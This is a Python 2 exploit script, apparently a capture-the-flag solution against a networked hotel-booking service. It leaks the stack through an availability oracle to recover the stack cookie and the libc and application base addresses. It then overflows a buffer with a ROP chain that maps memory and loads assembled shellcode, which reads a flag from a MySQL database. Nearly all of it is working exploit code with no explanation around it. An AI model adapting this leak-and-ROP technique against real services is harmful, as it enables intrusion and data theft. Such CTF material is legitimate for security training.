#!/usr/bin/env python2
import socket
import struct
import subprocess

#offsets on the stack
off_frame  = 8 * -0xd18
off_occ    = 8 * -0x860
off_cookie = 8 * -0x40
off_ret    = 8 * -0

off_frame  -= off_occ
off_cookie -= off_occ
off_ret    -= off_occ
off_occ    -= off_occ

#create values for dumping the whole stack frame
stack_dump_infos = []
for p in xrange(off_cookie, off_ret + (8 * 8)):
	if ((p - off_cookie) / 64) in (0,4,8):
		stack_dump_infos.append((p - off_cookie, 0, p - 19, 19 - p))

def ru(u):
	d = ""
	while not d.endswith(u):
		c = s.recv(4096)
		assert(c)
		d += c
		#print `d`
	return d

s = socket.socket()
s.connect(("93.31c3ctf.aachen.ccc.de", 1234))

ru("\n> ")
s.sendall("%\n")
ru("\n> ")
s.sendall("1\n")
ru("\n> ")
s.sendall("2015-01-01\n")
ru("\n> ")
s.sendall("0\n")
ru("\n> ")

print "[-] dumping stack..."

stack_dump_values = {}
stack = list("\x00" * (9*8))
byte = 0
for pos, a,c,i in stack_dump_infos:
	for x in (a,c,i):
		s.sendall("%d\n" % x)
		last = ru("\n> ")
	available = "Sorry, this occupancy is not available in this hotel." not in last
	if available:
		s.sendall("4\n")
		ru("\n> ")
		byte |= 1 << (pos & 7)
	if pos & 7 != 7:
		continue
	print (pos >> 3)
	stack[pos >> 3] = chr(byte)
	byte = 0
stack = struct.unpack("Q"*9, "".join(stack))
cookie = stack[0]
#stack_addr = stack[1]
appbase = stack[4] - 0x1910
libcbase = stack[8] - 0x21ec5

print "[+] libc base: 0x%08x" % libcbase
print "[+] app base:  0x%08x" % appbase
print "[+] cookie:  0x%08x" % cookie

for x in (1,0,0,0):
	s.sendall("%d\n" % x)
	ru("\n> ")

writable_addr = appbase + 0x203020
mmap = libcbase + 0xf52b0
read = libcbase + 0xebfb0
pop_rdi = libcbase + 0x22a0a
pop_rsi = libcbase + 0x246f5
pop_rdx = libcbase + 0x1b8e

ret = libcbase + 0x937 #ret
pop_rax = libcbase + 0x1aed0 #pop rax ; ret
pop_rcx = libcbase + 0x1872a9 #pop rcx ; cld ; jmp rax
pop_r8  = libcbase + 0x1279d6 #pop r8 ; mov eax, 1 ; ret
shl_r9  = libcbase + 0x480c5 #shl r9, cl ; mov qword ptr [rdi], r9 ; ret
pop_r10 = libcbase + 0x1082b5 #pop r10 ; ret
pop_r12 = libcbase + 0x1f668 #pop r12 ; ret
pop_r13 = libcbase + 0x1fef7 #pop r13 ; ret
pop_r14 = libcbase + 0x246f4 #pop r14 ; ret
pop_r15 = libcbase + 0x22a09 #pop r15 ; ret

#pop_r9 = libcbase + 0x
#pop_rax = libcbase + 0x193b8
#deref_rax = libcbase + 0x11d0d8
#mov_rdi_rax = libcbase + 0x187bac # push rax ; pop rdi ; cld ; jmp rsi
#ret = libcbase + 0x937

shellcode_addr = 0x08000000
shellcode = """
[BITS 64]
[ORG 0x08000000]

; rdi holds app base
mov r12, rdi

; load con
lea rax, [r12 + 0x203038]
mov rdi, [rax]

; load query addr
mov rsi, query

; call mysql_query(con, query)
lea rax, [r12 + 0xfb0]
call rax

; load con
lea rax, [r12 + 0x203038]
mov rdi, [rax]

; call mysql_store_result(con)
lea rax, [r12 + 0xee0]
call rax

; load res
mov rdi, rax

; call mysql_fetch_row(con)
lea rax, [r12 + 0xea0]
call rax

; load res[0]
mov rdi, [rax]

; call puts(res[0])
lea rax, [r12 + 0xec0]
call rax

; set return value
mov rdi, 0

; call exit(0)
lea rax, [r12 + 0x1080]
call rax

; access *0 -> crash
mov rax, 0
mov [rax], rax

; infinite loop if something fails
loop:
jmp loop

query:
db 'select * from flag;', 0
"""
file("/tmp/nasm.tmp","wb").write(shellcode)
shellcode = subprocess.check_output(["/bin/sh", "-c", "nasm -fbin -o /dev/stdout /tmp/nasm.tmp"])

ropchain = ""
ropchain += "A" * (1024+8)
ropchain += struct.pack("Q", cookie)
ropchain += "A" * (8*7)

#zero r9
ropchain += struct.pack("QQ", pop_rax, ret)
ropchain += struct.pack("QQ", pop_rcx, 63)
ropchain += struct.pack("QQ", pop_rdi, writable_addr)
ropchain += struct.pack("Q", shl_r9)
ropchain += struct.pack("Q", shl_r9)

ropchain += struct.pack("QQ", pop_rdi, shellcode_addr) #addr
ropchain += struct.pack("QQ", pop_rsi, (len(shellcode) + 4095) & ~4095) #length
ropchain += struct.pack("QQ", pop_rdx, 7) #prot
ropchain += struct.pack("QQ", pop_rcx, 0x32) #flags
ropchain += struct.pack("Qq", pop_r8, -1)
#ropchain += struct.pack("QQ", pop_r9, 0)

ropchain += struct.pack("Q", mmap)

ropchain += struct.pack("QQ", pop_rdi, 0)
ropchain += struct.pack("QQ", pop_rsi, shellcode_addr)
ropchain += struct.pack("QQ", pop_rdx, len(shellcode))

ropchain += struct.pack("Q", read)

ropchain += struct.pack("QQ", pop_rdi, appbase)
ropchain += struct.pack("Q", shellcode_addr)

print "[-] sending ropchain"

raw_input()
s.sendall(ropchain + "\n")

ru("Goodbye.\n")

print "[-] sending shellcode"
s.sendall(shellcode)

print "[+] awaiting flag"
while 1:
	d = s.recv(4096)
	if not d:
		break
	print d
